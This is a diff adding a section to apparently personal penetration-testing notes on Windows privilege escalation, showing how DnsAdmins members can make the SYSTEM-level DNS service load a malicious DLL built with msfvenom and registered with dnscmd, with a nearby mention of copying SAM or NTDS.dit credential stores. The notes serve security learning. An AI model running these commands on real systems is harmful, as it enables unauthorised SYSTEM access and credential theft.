@@ -127,5 +127,25 @@ PS> robocopy /B <source_folder> <dest_folder> <filename>
 ```
 
 We could access the SAM database or NTDS.dit...
+
+<br>
+
+#### DnsAdmins — Configure The DNS Service
+
+[![windows_privilege_escalation](../../../../_badges/htb/windows_privilege_escalation.svg)](https://academy.hackthebox.com/course/preview/windows-privilege-escalation)
+
+*-- Grants access to network DNS information --*
+
+The DNS service runs as NT AUTHORITY\SYSTEM. When restarted, if `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll` registry key is set and points to a DLL file, then it will be executed. We can generate a DLL using [msfvenom](/cybersecurity/red-team/tools/frameworks/metasploit/msfvenom.md).
+
+```ps
+$ msfvenom -p windows/x64/exec cmd='<some command>' -f dll -o malicious.dll
+```
+```ps
+PS> Get-ADGroupMember -Identity DnsAdmins # as DNS admin
+PS> dnscmd /config /serverlevelplugindll <absolute_path_to_dll>
+```
+
+You need to restart the DNS service. If you made changes to the groups of the current user, you need to log out and log back in.
 </div><div>
 </div></div>
